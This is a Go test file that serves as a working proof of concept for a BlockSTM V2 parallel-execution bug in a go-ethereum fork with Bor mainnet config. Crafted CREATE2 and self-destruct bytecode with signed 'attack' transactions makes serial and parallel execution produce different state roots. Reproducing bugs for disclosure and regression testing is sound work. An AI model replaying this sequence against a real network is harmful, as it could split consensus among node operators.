package core

import (
    "context"
    "crypto/ecdsa"
    "crypto/sha256"
    "fmt"
    "math/big"
    "testing"

    "github.com/holiman/uint256"

    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/core/blockstm"
    "github.com/ethereum/go-ethereum/core/rawdb"
    "github.com/ethereum/go-ethereum/core/state"
    "github.com/ethereum/go-ethereum/core/tracing"
    "github.com/ethereum/go-ethereum/core/types"
    "github.com/ethereum/go-ethereum/core/vm"
    "github.com/ethereum/go-ethereum/core/vm/program"
    "github.com/ethereum/go-ethereum/crypto"
    "github.com/ethereum/go-ethereum/params"
    "github.com/ethereum/go-ethereum/triedb"
)

const (
    labSDAmount   = uint64(7)
    labSDBlock    = uint64(91_949_701)
    labSDGasLimit = uint64(30_000_000)
)

var labSDCoinbase = common.HexToAddress("0xcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcb")

type labSDContracts struct {
    factory     common.Address
    controller  common.Address
    beneficiary common.Address
    drain       common.Address
    target      common.Address
    factoryCode []byte
    controlCode []byte
    attackKey   *ecdsa.PrivateKey
}

func TestLabV2SelfDestructBalanceDivergence(t *testing.T) {
    c := labSDBuildContracts(t)
    config := params.BorMainnetChainConfig
    baseFee := big.NewInt(1)
    tdb, root := labSDBaseState(t, c)
    signer := types.MakeSigner(config, new(big.Int).SetUint64(labSDBlock), 1)
    txs, msgs := labSDTransactions(t, c, signer, baseFee)
    blockCtx := vm.BlockContext{
        CanTransfer: CanTransfer,
        Transfer: Transfer,
        GetHash: func(uint64) common.Hash { return common.Hash{} },
        Coinbase: labSDCoinbase,
        GasLimit: labSDGasLimit,
        BlockNumber: new(big.Int).SetUint64(labSDBlock),
        Time: 1,
        BaseFee: baseFee,
        Random: &common.Hash{},
    }

    // Passing control: the setup transaction alone does not expose the stale
    // MVBalanceStore entry to a later transaction, so serial and V2 must agree.
    controlSerial := labSDRunSerial(t, tdb, root, txs[:1], msgs[:1], blockCtx, config)
    controlV2 := labSDRunV2(t, tdb, root, txs[:1], msgs[:1], blockCtx, config, 8)
    controlSerialRoot := controlSerial.IntermediateRoot(true)
    controlV2Root := controlV2.IntermediateRoot(true)
    t.Logf("CONTROL serial_root=%s v2_root=%s target_serial=%s target_v2=%s",
        controlSerialRoot, controlV2Root,
        controlSerial.GetBalance(c.target), controlV2.GetBalance(c.target))
    if controlSerialRoot != controlV2Root {
        t.Fatalf("negative control diverged: serial=%s v2=%s", controlSerialRoot, controlV2Root)
    }

    // Attack: tx0 creates, selfdestructs and late-funds target; tx1 redeploys
    // the same CREATE2 address and reads the stale pre-destruction balance in V2.
    serialDB := labSDRunSerial(t, tdb, root, txs, msgs, blockCtx, config)
    v2DB := labSDRunV2(t, tdb, root, txs, msgs, blockCtx, config, 8)
    serialRoot := serialDB.IntermediateRoot(true)
    v2Root := v2DB.IntermediateRoot(true)
    serialTarget := serialDB.GetBalance(c.target)
    v2Target := v2DB.GetBalance(c.target)
    serialBeneficiary := serialDB.GetBalance(c.beneficiary)
    v2Beneficiary := v2DB.GetBalance(c.beneficiary)

    t.Logf("ATTACK serial_root=%s v2_root=%s", serialRoot, v2Root)
    t.Logf("ATTACK target_serial=%s target_v2=%s beneficiary_serial=%s beneficiary_v2=%s",
        serialTarget, v2Target, serialBeneficiary, v2Beneficiary)

    if !serialTarget.IsZero() || !serialBeneficiary.IsZero() {
        t.Fatalf("serial reference did not burn the late-funded balance: target=%s beneficiary=%s",
            serialTarget, serialBeneficiary)
    }
    if serialRoot == v2Root {
        t.Fatal("v2.10.2 did not reproduce the expected state-root divergence")
    }
    if v2Target.IsZero() && v2Beneficiary.IsZero() {
        t.Fatal("roots diverged without the expected stale-balance consequence")
    }
    t.Log("VULNERABLE: ordinary EVM transactions produce different serial and BlockSTM V2 post-state roots")
}

func labSDBuildContracts(t testing.TB) labSDContracts {
    t.Helper()
    attackKey := labSDKeys(1, 0xa1)[0]
    drainKey, err := crypto.HexToECDSA("000000000000000000000000000000000000000000000000000000000000d00d")
    if err != nil { t.Fatal(err) }
    c := labSDContracts{
        factory: common.HexToAddress("0x00000000000000000000000000000000000000c0"),
        controller: common.HexToAddress("0x00000000000000000000000000000000000000c1"),
        beneficiary: common.HexToAddress("0x00000000000000000000000000000000000000c2"),
        drain: crypto.PubkeyToAddress(drainKey.PublicKey),
        attackKey: attackKey,
    }
    targetRuntime := labSDTargetRuntime(c.drain)
    targetInit := program.New().
        Push0().Push0().Push0().Push0().
        Op(vm.SELFBALANCE).Push(c.beneficiary).Op(vm.GAS, vm.CALL, vm.POP).
        ReturnViaCodeCopy(targetRuntime).
        Bytes()
    var salt [32]byte
    c.target = crypto.CreateAddress2(c.factory, salt, crypto.Keccak256(targetInit))
    c.factoryCode = program.New().
        Mstore(targetInit, 0).
        Push(0).Push(len(targetInit)).Push(0).Push(0).
        Op(vm.CREATE2, vm.POP, vm.STOP).
        Bytes()
    c.controlCode = program.New().
        Call(nil, c.factory, 0, 0, 0, 0, 0).Op(vm.POP).
        Call(nil, c.target, 0, 0, 0, 0, 0).Op(vm.POP).
        Push(1).Push(0).Op(vm.MSTORE8).
        Call(nil, c.target, labSDAmount, 0, 1, 0, 0).Op(vm.POP, vm.STOP).
        Bytes()
    return c
}

func labSDTargetRuntime(drain common.Address) []byte {
    width := len(new(big.Int).SetBytes(drain.Bytes()).Bytes())
    if width == 0 { width = 1 }
    jumpDest := 13 + width
    return program.New().
        Push0().Op(vm.CALLDATALOAD).Push(0xf8).Op(vm.SHR).
        Push(1).Op(vm.EQ).Push(jumpDest).Op(vm.JUMPI).
        Push(drain).Op(vm.SELFDESTRUCT, vm.JUMPDEST, vm.STOP).
        Bytes()
}

func labSDBaseState(t testing.TB, c labSDContracts) (*triedb.Database, common.Hash) {
    t.Helper()
    tdb := triedb.NewDatabase(rawdb.NewMemoryDatabase(), triedb.HashDefaults)
    sdb, err := state.New(common.Hash{}, state.NewDatabase(tdb, nil))
    if err != nil { t.Fatal(err) }
    sdb.AddBalance(crypto.PubkeyToAddress(c.attackKey.PublicKey), uint256.NewInt(1_000_000_000_000_000_000), tracing.BalanceChangeUnspecified)
    sdb.SetCode(c.factory, c.factoryCode, tracing.CodeChangeUnspecified)
    sdb.SetCode(c.controller, c.controlCode, tracing.CodeChangeUnspecified)
    root, err := sdb.Commit(0, false, false)
    if err != nil { t.Fatal(err) }
    if err := tdb.Commit(root, false); err != nil { t.Fatal(err) }
    return tdb, root
}

func labSDTransactions(t testing.TB, c labSDContracts, signer types.Signer, baseFee *big.Int) (types.Transactions, []*Message) {
    t.Helper()
    specs := []struct { to common.Address; value uint64 }{{c.controller, labSDAmount}, {c.factory, 0}}
    txs := make(types.Transactions, 0, len(specs))
    msgs := make([]*Message, 0, len(specs))
    for i, spec := range specs {
        to := spec.to
        tx, err := types.SignTx(types.NewTx(&types.DynamicFeeTx{
            ChainID: signer.ChainID(), Nonce: uint64(i), GasTipCap: big.NewInt(1),
            GasFeeCap: big.NewInt(1_000_000_000), Gas: 750_000, To: &to,
            Value: new(big.Int).SetUint64(spec.value),
        }), signer, c.attackKey)
        if err != nil { t.Fatal(err) }
        msg, err := TransactionToMessage(tx, signer, baseFee)
        if err != nil { t.Fatal(err) }
        txs = append(txs, tx)
        msgs = append(msgs, msg)
    }
    return txs, msgs
}

func labSDRunSerial(t testing.TB, tdb *triedb.Database, root common.Hash, txs types.Transactions, msgs []*Message, blockCtx vm.BlockContext, config *params.ChainConfig) *state.StateDB {
    t.Helper()
    sdb, err := state.New(root, state.NewDatabase(tdb, nil))
    if err != nil { t.Fatal(err) }
    pool := new(GasPool).AddGas(blockCtx.GasLimit)
    var used uint64
    for i, tx := range txs {
        sdb.SetTxContext(tx.Hash(), i)
        evm := vm.NewEVM(blockCtx, sdb, config, vm.Config{})
        if _, err := ApplyTransactionWithEVM(msgs[i], pool, sdb, blockCtx.BlockNumber, common.Hash{}, blockCtx.Time, tx, &used, evm); err != nil {
            t.Fatalf("serial tx %d: %v", i, err)
        }
    }
    return sdb
}

func labSDRunV2(t testing.TB, tdb *triedb.Database, root common.Hash, txs types.Transactions, msgs []*Message, blockCtx vm.BlockContext, config *params.ChainConfig, workers int) *state.StateDB {
    t.Helper()
    base, err := state.New(root, state.NewDatabase(tdb, nil))
    if err != nil { t.Fatal(err) }
    finalDB, err := state.New(root, state.NewDatabase(tdb, nil))
    if err != nil { t.Fatal(err) }
    tasks := make([]V2Task, len(txs))
    for i := range txs { tasks[i] = V2Task{Index: i, Tx: txs[i], Msg: msgs[i]} }
    result := ExecuteV2BlockSTM(context.Background(), tasks, base, blockstm.NewMVStore(), blockstm.NewMVBalanceStore(), blockCtx, common.Hash{}, vm.Config{}, config, blockCtx.GasLimit, workers, finalDB, nil)
    if result.PanickedIdx >= 0 { t.Fatalf("V2 tx %d panicked", result.PanickedIdx) }
    if result.ExecErrIdx >= 0 { t.Fatalf("V2 tx %d: %v", result.ExecErrIdx, result.ExecErr) }
    if result.ReadErr != nil { t.Fatalf("V2 read error: %v", result.ReadErr) }
    return finalDB
}

func labSDKeys(n int, tag byte) []*ecdsa.PrivateKey {
    keys := make([]*ecdsa.PrivateKey, n)
    for i := range n {
        seed := sha256.Sum256([]byte{tag, byte(i)})
        key, err := crypto.ToECDSA(seed[:])
        if err != nil { panic(err) }
        keys[i] = key
    }
    return keys
}

func labSDWorkerName(workers int) string { return fmt.Sprintf("workers_%d", workers) }
